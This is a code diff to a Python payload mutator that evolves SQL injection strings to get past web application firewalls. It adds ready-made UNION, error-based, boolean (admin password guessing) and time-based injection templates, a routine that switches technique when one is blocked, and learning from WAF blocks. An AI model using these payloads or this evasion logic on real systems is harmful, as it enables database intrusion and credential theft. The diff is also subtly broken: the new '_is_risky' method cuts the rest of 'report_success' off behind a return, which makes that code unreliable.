@@ -31,9 +31,52 @@ class ASTMutator:
         self.success_dna = [] # Store sequences of mutations that worked
         self.blocked_signatures = set()
         self.successful_recipes = [] # Store recipes (lists of strategies) that worked
+        self.failure_memory = {} # Store patterns that consistently fail
+        self.mutation_history = {} # Track payload -> (strategy, parent_score)
+        self.inferred_rules = [] # Rules from WAFRuleInferrer
+        self.sqli_templates = {
+            "UNION": "1' UNION SELECT NULL,DATABASE(),USER()--",
+            "ERROR": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+            "BOOLEAN": "1' AND (SELECT 1 FROM users WHERE user='admin' AND password LIKE 'a%')--",
+            "TIME": "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
+        }
+
+    def semantic_pivot(self, current_payload, target_type=None):
+        """
+        Transforms the payload into a completely different SQLi technique.
+        Used when one technique is consistently blocked or failing.
+        """
+        types = list(self.sqli_templates.keys())
+        if not target_type:
+            # Pick a different type than what we are likely using
+            current_type = "UNION" if "UNION" in current_payload.upper() else "BOOLEAN"
+            target_type = random.choice([t for t in types if t != current_type])
+
+        print(f"  [Pivot] Switching strategy to {target_type}...", flush=True)
+        new_base = self.sqli_templates[target_type]
+        
+        # Try to maintain the "wrapping" context (quotes, parentheses)
+        prefix = ""
+        if current_payload.startswith("'"): prefix = "'"
+        elif current_payload.startswith('"'): prefix = '"'
+        
+        if prefix and not new_base.startswith(prefix):
+            new_base = prefix + new_base[1:] if new_base.startswith("'") or new_base.startswith('"') else prefix + new_base
+
+        return new_base
 
     def apply_hint(self, hint):
         """Applies AI-driven or WAF-driven hints to mutation logic."""
+        # Handle Inferred Rules
+        if "inferred_rule" in hint:
+            rule = hint["inferred_rule"]
+            self.inferred_rules.append(rule)
+            print(f"[*] Mutator: WAF Rule Inferred - {rule['type']} for '{rule['pattern']}'", flush=True)
+            # Penalize tokens in the pattern
+            for token in self.token_reputation:
+                if token in rule["pattern"].upper():
+                    self.token_reputation[token] *= 0.5
+
         strategy = hint.get("strategy")
         if strategy and strategy in self.strategy_weights:
             self.strategy_weights[strategy] *= 1.5
@@ -111,7 +154,14 @@ class ASTMutator:
                 weights = [current_weights[n] for n in names]
                 strat_name = random.choices(names, weights=weights, k=1)[0]
                 
-                mutated = self.strategies[strat_name](mutated)
+                temp_mutated = self.strategies[strat_name](mutated)
+                
+                # Learning: If the mutation results in a known risky pattern, try again once
+                if self._is_risky(temp_mutated):
+                    strat_name = random.choices(names, weights=weights, k=1)[0]
+                    temp_mutated = self.strategies[strat_name](mutated)
+
+                mutated = temp_mutated
                 applied_recipe.append(strat_name)
             
         # 5. Differential Bisection Analysis: Target known blocked signatures
@@ -139,22 +189,45 @@ class ASTMutator:
         return obfuscated
 
     def report_success(self, payload, score, strategy_used=None):
-        """Gene Credit Assignment: Update strategy and token reputation based on score."""
+        """Negative Reinforcement Learning: Learn from both success and failure."""
         if not strategy_used:
             strategy_used = self.last_strategy_used
 
-        # Token-Level Credit Assignment
+        # 1. Backtracking Analysis: Compare with parent score
+        history = self.mutation_history.get(payload)
+        if history:
+            parent_score = history.get("parent_score", 0)
+            strategy = history.get("strategy")
+            
+            if score < parent_score - 0.2:
+                # This mutation made things significantly worse!
+                print(f"  [-] Mutator: Strategy {strategy} failed. Score dropped from {parent_score} to {score}. Penalizing.", flush=True)
+                if strategy in self.strategy_weights:
+                    self.strategy_weights[strategy] *= 0.5 # Heavy penalty
+                
+                # Store as a "Failure Pattern" if it was a WAF block
+                if score <= 0.1:
+                    self.failure_memory[payload] = strategy
+
+        # 2. Token-Level Credit Assignment
         payload_upper = payload.upper()
         for token in self.token_reputation.keys():
             if token in payload_upper or token in payload:
                 if score <= 0.1:
                     # Penalize tokens present in blocked payloads
-                    self.token_reputation[token] -= 0.1
-                    self.token_reputation[token] = max(0.1, self.token_reputation[token])
+                    self.token_reputation[token] -= 0.15
+                    self.token_reputation[token] = max(0.05, self.token_reputation[token])
                 elif score >= 0.8:
                     # Reward tokens present in successful payloads
                     self.token_reputation[token] += 0.2
                     self.token_reputation[token] = min(5.0, self.token_reputation[token])
+
+    def _is_risky(self, payload):
+        """Checks if a payload contains patterns that previously failed."""
+        for failed_p in self.failure_memory:
+            if failed_p in payload:
+                return True
+        return False
 
         # Detect if we are being blocked consistently
         if score <= 0.1:
